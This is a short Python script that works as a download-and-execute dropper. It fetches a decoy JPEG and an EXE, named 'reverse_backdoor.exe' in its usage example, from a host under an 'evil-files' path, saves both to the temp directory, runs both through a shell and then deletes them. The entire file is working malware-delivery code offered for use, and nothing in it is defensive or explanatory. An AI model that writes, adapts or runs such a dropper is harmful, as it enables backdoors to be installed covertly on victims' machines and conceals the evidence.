#!/usr/bin/env python
import argparse
import tempfile
import requests
import subprocess
import os

'''
        Run the script by providing the required arguments in the following format: 
        
        python file_downloader.py http://192.168.100.210/evil-files/lambo.jpeg http://192.168.100.210/evil-files/reverse_backdoor.exe. 
        
        The arguments are the URLs of the JPEG and EXE files you want to download, execute, and then remove.
        The script will download the files to the temp directory, execute them, and then remove them.
'''


def download(url):
    """Download a file from the given URL."""

    # Send a GET request to the URL
    response = requests.get(url)
    # Extract the filename from the URL
    filename = url.split('/')[-1]

    # Open the file in write-binary mode and write the content
    with open(filename, 'wb') as file:
        file.write(response.content)

    # Return the filename for further processing
    return filename


def run_files(jpeg_url, exe_url):
    """Download files, execute them and then remove them."""

    # Change the working directory to the temp directory
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)

    # Download the jpeg file and run it
    jpeg_filename = download(jpeg_url)
    subprocess.Popen(jpeg_filename, shell=True)

    # Download the exe file and run it
    exe_filename = download(exe_url)
    subprocess.call(exe_filename, shell=True)

    # Remove the files
    os.remove(jpeg_filename)
    os.remove(exe_filename)


if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description="File Download and Run Script")
    parser.add_argument("-f", "--jpeg-url", dest="jpeg_url",
                        help="The URL of the JPEG file")
    parser.add_argument("-e", "--exec-url", dest="exe_url",
                        help="The URL of the EXE file")
    args = parser.parse_args()

    # Download, run and remove the files
    run_files(args.jpeg_url, args.exe_url)
